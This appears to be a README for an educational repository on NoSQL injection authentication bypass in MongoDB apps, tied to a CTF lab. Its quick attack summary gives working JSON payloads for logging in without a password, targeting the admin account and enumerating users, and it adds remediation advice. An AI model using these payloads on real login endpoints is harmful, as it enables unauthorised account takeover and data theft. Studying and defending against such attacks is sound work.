# 🔓 Authentication Bypass via NoSQL Injection

![NoSQL Injection](https://img.shields.io/badge/Category-Web%20Exploitation-red?style=flat-square) ![MongoDB](https://img.shields.io/badge/Database-MongoDB-green?style=flat-square) ![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange?style=flat-square) ![OWASP](https://img.shields.io/badge/OWASP-A03%3A2021%20Injection-blue?style=flat-square)

> A complete research and lab guide on **Authentication Bypass via NoSQL Injection** — covering core concepts, attack techniques, step-by-step exploitation, payload cheatsheet, tools, CTF walkthrough, and full remediation guidance.

---

## 📁 Repository Structure

```
Authentication-Bypass-via-NoSQL-Injection/
│
├── README.md                        ← You are here — full overview & quick start
├── writeup/
│   └── nosql-injection-walkthrough.md   ← Full CTF lab walkthrough (Defhawk)
├── payloads/
│   └── nosql-payloads-cheatsheet.md     ← All operators, payloads & examples
└── tools/
    └── tools-and-setup.md               ← Burp Suite, tools setup & tips
```

---

## 📖 What Is NoSQL Injection?

NoSQL Injection is a web security vulnerability that occurs when an application passes **unsanitised user input** directly into a NoSQL database query (e.g., MongoDB). Instead of injecting SQL syntax, an attacker injects **MongoDB query operators** such as `$ne`, `$gt`, `$regex`, or `$nin` to manipulate the query logic.

This is classified as **OWASP A03:2021 — Injection**, one of the top critical web vulnerabilities.

### How It Differs from SQL Injection

| Feature | SQL Injection | NoSQL Injection |
|--------|--------------|----------------|
| Target DB | Relational (MySQL, MSSQL) | Document-based (MongoDB, CouchDB) |
| Payload format | SQL syntax (`' OR 1=1--`) | JSON operators (`{"$ne": "x"}`) |
| Common operators | `OR`, `AND`, `UNION` | `$ne`, `$gt`, `$regex`, `$nin` |
| Transport | URL params, form fields | JSON request body |
| Detection tool | sqlmap | Burp Suite, manual |

---

## 🎯 Attack Goals

If NoSQL Injection is possible, an attacker can:

- ✅ **Bypass authentication** — log in without a valid password
- ✅ **Enumerate all user accounts** in the database
- ✅ **Extract or modify records** in any collection
- ✅ **Cause denial of service** via expensive query operators
- ✅ **Execute server-side JavaScript** via `$where` operator (MongoDB < 4.4)

---

## ⚙️ Technologies Targeted

This research focuses on:

- **Database:** MongoDB (document-oriented NoSQL)
- **Backend:** Node.js / Express.js
- **Frontend:** React.js / Next.js
- **Auth endpoint:** `POST /api/v2/auth/signin` (JSON body)
- **Tool:** Burp Suite (Intercept + Repeater)

---

## 🚀 Quick Attack Summary

### 1. Find the Vulnerable Endpoint
Use browser DevTools (Network tab) to capture the login `POST` request.

### 2. Intercept with Burp Suite
Capture `POST /api/v2/auth/signin` and send to **Repeater**.

### 3. Inject `$ne` Operator
```json
{"userID": {"$ne": "x"}, "password": {"$ne": "x"}}
```
This matches **any** user where userID ≠ "x" AND password ≠ "x" → returns the first user (admin).

### 4. Target Admin Specifically
```json
{"userID": {"$regex": "admin"}, "password": {"$ne": "x"}}
```

### 5. Enumerate All Users with `$nin`
```json
{"userID": {"$nin": ["admin", "dave@gmail.com"]}, "password": {"$ne": "x"}}
```
Keep adding known userIDs to the array until you get `401 Unauthorized` — all accounts found.

### 6. Use Session Token
Use the returned `sessToken` cookie to access protected endpoints like:
```
GET /api/v2/account/details
```

---

## 📂 Files in This Repo

| File | Description |
|------|-------------|
| [`writeup/nosql-injection-walkthrough.md`](./writeup/nosql-injection-walkthrough.md) | Full step-by-step CTF lab walkthrough |
| [`payloads/nosql-payloads-cheatsheet.md`](./payloads/nosql-payloads-cheatsheet.md) | All operators and payload examples |
| [`tools/tools-and-setup.md`](./tools/tools-and-setup.md) | Burp Suite setup and recommended tools |

---

## 🛡️ Remediation (Developer Summary)

1. **Validate input types** — reject JSON objects where strings are expected
2. **Use a schema validator** — Joi or Zod to enforce structure before DB calls
3. **Sanitize `$` operators** — strip keys starting with `$` from user input
4. **Use an ODM** — Mongoose with strict schemas prevents operator injection
5. **Apply least-privilege** — DB user should only access needed collections
6. **Enable logging/monitoring** — alert on queries containing operators

---

## 📚 References

- [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PortSwigger NoSQL Injection Labs](https://portswigger.net/web-security/nosql-injection)
- [OWASP NoSQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [Invicti: Authentication Bypass via MongoDB Operator Injection](https://www.invicti.com/web-application-vulnerabilities/authentication-bypass-via-mongodb-operator-injection)
- [IntelligenceX: NoSQL Injection Complete Guide](https://blog.intelligencex.org/nosql-injection-vulnerabilities-complete-guide)

---

## 👤 Author

**Rajsegar Alagarathnam**  
Aspiring Penetration Tester | Applied Offensive Security  
[GitHub](https://github.com/rajsegar)

---

> ⚠️ **Disclaimer:** This repository is for educational and ethical security research purposes only. Only test on systems you own or have explicit written permission to test.
